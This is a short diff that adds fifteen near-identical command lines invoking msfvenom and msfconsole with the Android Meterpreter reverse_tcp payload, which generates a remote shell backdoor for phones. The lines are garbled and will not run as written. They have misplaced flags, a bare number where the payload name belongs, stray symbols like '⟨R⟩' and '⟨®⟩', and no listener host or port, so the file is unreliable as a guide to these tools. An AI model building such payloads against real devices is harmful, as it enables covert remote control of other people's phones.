@@ -1,2 +1,15 @@
-msfvenom -1800 android/meterpreter/reverse_tcp ⟨R⟩
-msfvenom -1800 ⟨R⟩ ⟨®⟩ android/Meterpreter/reverse_tcp ⟨R⟩ ⟨®⟩   
+msfvenom -p 1800 android/meterpreter/reverse_tcp ⟨R⟩
+msfvenom -p 1800 ⟨R⟩ ⟨®⟩ android/Meterpreter/reverse_tcp ⟨®⟩   
+msfvenom -p 1800 android/meterpreter/reverse_tcp ⟨R⟩
+msfvenom -p 1800 android/meterpreter/reverse_tcp R⟩
+msfvenom -p 1800 android/Meterpreter/reverse_tcp ⟨R⟩
+msfconsole -p 1800 android/meterpreter/reverse_tcp ⟨R⟩
+msfconsole -p 1800 ⟨R⟩ ⟨®⟩ android/Meterpreter/reverse_tcp ⟨®⟩   
+msfconsole -p 1800 android/meterpreter/reverse_tcp ⟨R⟩
+msfconsole -p 1800 android/meterpreter/reverse_tcp R⟩
+msfconsole -p 1800 android/Meterpreter/reverse_tcp ⟨R⟩
+msfvenom -p 1800 android/Meterpreter/reverse_tcp ⟨R⟩
+msfvenom -p 1800 ⟨R⟩ ⟨®⟩ android/Meterpreter/reverse_tcp ⟨®⟩   
+msfvenom -p 1800 android/Meterpreter/reverse_tcp ⟨R⟩
+msfvenom -p 1800 android/Meterpreter/reverse_tcp R⟩
+msfvenom -p 1800 android/Meterpreter/reverse_tcp ⟨®⟩
